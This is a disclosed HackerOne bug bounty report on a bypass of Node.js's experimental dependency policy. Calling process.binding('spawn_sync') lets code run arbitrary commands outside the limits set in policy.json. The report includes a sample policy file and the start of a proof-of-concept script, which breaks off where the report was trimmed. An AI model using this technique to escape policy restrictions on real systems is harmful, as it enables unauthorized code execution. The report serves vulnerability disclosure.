# [M] Dependency Policy Bypass via process.binding

## Summary
Severity: Medium (CVSS 5.5)
Program: Internet Bug Bounty
Weakness: Privilege Escalation
Reporter: leodog896
State: resolved
Disclosed: 2023-09-09T15:11:23.523Z
Source: https://hackerone.com/reports/2120719

## Details
# Preface (for the Internet Bug Bounty)

The entire vulnerability can be found in HackerOne @ [Dependency Policy Bypass via process.binding](https://hackerone.com/reports/1946470#activity-21276452). For the sake of convenience, I've pasted the entire report down below.

# Copied Vulnerability

**Summary:** By taking advantage of `process.binding('spawn_sync');`, a malicious actor can run arbitrary code, outside of the limits defined in a `policy.json` file.

**Description:** The experimental policy feature for NodeJS is used usually for security reasons, including validating integrity of source code and limiting module access to files. This vulnerability allows an actor to bypass the latter part of its security features, by loading in any module from an external Node.JS script.

Since the required modules use internal bindings, by fetching these bindings themselves, it is possible to neglect the dependency policy altogether.

This also exists within almost all `process.binding` modules with less or the same severity.

## Steps To Reproduce:

1. Create `policy.json`:
```json
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {}
    }
  }
}
```

2. Create `app.js`:
```js
const { spawn } = process.binding("spawn_sync");

function arbitraryExecute(input) {
    const result = spawn({
        maxBuffer: 1048576,
        args: ["node", "-"],
        cwd: undefined,
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/2120719_
